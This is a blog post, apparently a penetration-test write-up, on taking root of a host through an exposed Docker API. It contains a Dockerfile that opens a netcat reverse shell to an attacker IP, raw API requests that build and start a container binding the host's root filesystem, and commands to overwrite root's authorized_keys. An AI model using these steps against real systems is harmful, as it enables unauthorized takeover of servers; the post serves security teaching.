---
layout: post
title: From Docker API To Root Access in 60 Seconds
date: '2017-10-09 16:25:06 -0700'
comments: true
published: true
---
I was tasked with performing a penetration testing on a server which hosted multiple websites and services. Most of these services ran on _Docker containers_, and in this article, I'm going to show how could an overlooked misconfiguration lead to a complete takeover of the **host** system.
<!--break-->
**Disclaimer:** This article was written for educational purposes, and the author is not responsible for any misuse of any of the tools or techniques demonstrated in the article.


## **What is Docker?**



## **Information Gathering**
Initial reconnaissance showed an open port that was apparently serving some sort of an API that supports JSON objects. Default response for any unknown requests was a JSON object like this:

	{"message":"page not found"}

By appending `/info` to the URL of the service to be like this: `http://10.0.5.10:4000/info`, we were able to view further information about the Docker service behind the API:

![Information about the Docker Daemon]({{ "https://raw.githubusercontent.com/fusionx3/fusionx3.github.io/master/images/docker_1.png" | absolute_url }})


So, the system administrator hasn't restricted access to the Docker API (A big mistake), and apparently, since the Docker daemon runs as a privileged user, I doubt that the system administration bothered

To enumerate the version of the API, we simply appended `v1.30/info` to the URL and the API explicitly told us its version:

`{"message":"client is newer than server (client API version: 1.30, server API version: 1.24)"}`


## **Gaining access to a container**
After some quick reading through the [Docker API Documentation](https://docs.docker.com/engine/api/v1.24/), creating a custom image and starting it as a container is simply a matter of a few POST requests.

Since Docker allows us to create an image from a _Dockerfile_ through the UNIX socket, it shouldn't be different if performed through the API, right?
We begin to craft our own malicious _Dockerfile_ and upload it anywhere on the internet. The Dockerfile I created utilized a clean Ubuntu installation and the good ol' netcat to give us a reverse TCP shell with root access to the container.

```
FROM ubuntu:16.04
RUN apt-get update -y && apt-get install netcat -y
CMD ["nc", "-n", "My_OWN_IP", "4444", "-e", "/bin/bash"]
```

Afterwards, we start to craft the POST request and the JSON object needed in order to build our image.

```
POST /build?remote=https://pastebin.com/raw/twq0c1M4 HTTP/1.1
Host: 10.0.5.10:4000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 2
{}
```

The reponse came confirming the creation of the image successfully
```
HTTP/1.1 201 Created
Server: nginx/1.10.3 (Ubuntu)
Date: Tue, 03 Oct, 2017 15:52:16 GMT
Content-Type: application/json
Content-Length: 90
Connection: Close

{"Id":"89a1eeb4c9a48a4d3a7bc300fc0b6164d32f2bd65b84e15ef60954b8bb38125d","Warnings":null}
```

We can confirm that our image has been created by going to this URL: http://10.0.5.10:4000/images/json. It should be the first one form the top.

Next step is to create a container from this image, and according to the documentation, it could be done using the following request:

```
POST /containers/create HTTP/1.1
Host: 10.0.5.10:4000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 207

{
	"Image": "sha256:00c1fade7392ddfdc9541735334cf52bc7aa938c52c03fd8ab8e60268de55625",
	"HostConfig": {
		"Binds": ["/:/root/hostroot"]}
}
```

That's where the magic happens. Assuming that the user which is running the docker daemon is privileged and able to view and edit all files on the host system, we simply _map_ or _bind_ the root's directory to a directory create inside the container itself. Theoritically, we should be able to browse the **HOST**'s file system "/" from inside the container by navigating into "/root/hostroot".

In case of a success container creation, the server's response will look like this:
```
HTTP/1.1 201 Created
Server: nginx/1.10.3 (Ubuntu)
Date: Tue, 03 Oct, 2017 15:54:16 GMT
Content-Type: application/json
Content-Length: 9140
Connection: Close

{"stream":"Step 1 : FROM ubuntu:16.04\n"}
...
SNIP
...
{"stream":"Removing intermediate container 51234bca51\n"}
{"stream":"Successfuly built 00c522fa85c\n"}
```

Last but not least, starting the container:
```
POST /containers/89a1eeb4c9a48a4d3a7bc300fc0b6164d32f2bd65b84e15ef60954b8bb38125d/start HTTP/1.1
Host: 10.0.5.10:4000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 4

{}
```
Make sure that you set up a netcat listener to receive the reverse TCP connection before starting the container.

A success response will typically look like the following:
```
HTTP/1.1 204 No Content
Server: nginx/1.10.3 (Ubuntu)
Date: Tue, 03 Oct, 2017 15:56:16 GMT
Content-Type: application/json
Connection: Close
```
And we should be receiving a new connection with a root reverse shell. Hurraaay!
<img src="https://github.com/fusionx3/fusionx3.github.io/blob/master/images/docker_2.png?raw=true" width="800" height="200" />


**Don't cheer up just yet, because we're still confined to the container.**


## **Escalating to the host's root**
Now, to the fun part! As mentioned above, we _mapped_ the host's root directory to a directory inside the container, which we called "hostroot". So, by simply nagivating to this directory, we are able to view the entire filesystem of the **host**.

`cd /root/hostroot`

For more convenience and to avoid getting confused and accidently browse files on the container rather than the host, we can simply use _chroot_ to change the current root directory:

`chroot /root/roothost`

Another mistake made by the system administration was allowing root login via SSH to the host. How did we know this? through the `sshd_config` file of course!

Anyhow, to be able to login as root, you can do one of two things(among many other things):

- Change the hashed password in `/etc/shadow` directly.

- Add your own public key into `/root/.ssh/authorized_keys`

> Note that -for some reason- you can't write into the file and save, but you can delete it and re-create it. Be careful not to delete existing public keys while pentesting. Save the current keys into a file and restore it in the clean-up phase.

`rm -rf /root/.ssh/authorized_keys && echo "YOUR_PUBLIC_KEY" > /root/.ssh/authorized_keys`

